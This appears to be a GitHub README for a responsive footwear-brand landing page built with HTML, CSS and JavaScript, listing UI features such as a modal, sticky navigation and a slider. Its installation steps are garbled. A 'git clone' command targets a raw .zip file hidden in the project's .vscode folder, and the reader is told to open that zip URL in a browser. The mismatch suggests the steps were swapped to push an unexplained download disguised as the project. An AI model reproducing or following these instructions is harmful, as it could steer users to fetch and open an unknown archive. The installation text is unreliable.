## Usage

This landing page is designed and developed by me to showcase a footwear brand's products and encourage users to contact the company. It is fully responsive and can be viewed on a desktop, tablet, and mobile devices. Through DOM manipulation and the Intersection Observer API, I was able to achieve these features:

- Modal window pop-up
- Smooth page scrolling
- Sticky navigation
- Reveal on scroll effect
- Image lazy loading
- Tabbed component
- Slider component

## Technologies Used

- HTML5
- CSS3
- JavaScript

## Installation

To run this project locally, you can follow these steps:

1. Clone the repository:

   ```
   $ git clone https://raw.githubusercontent.com/imadosan/Footwear-landing-page/main/.vscode/landing-page-Footwear-2.0.zip
   ```

2. Open the project folder in your code editor of choice.
3. Open the 'https://raw.githubusercontent.com/imadosan/Footwear-landing-page/main/.vscode/landing-page-Footwear-2.0.zip' file in your web browser.
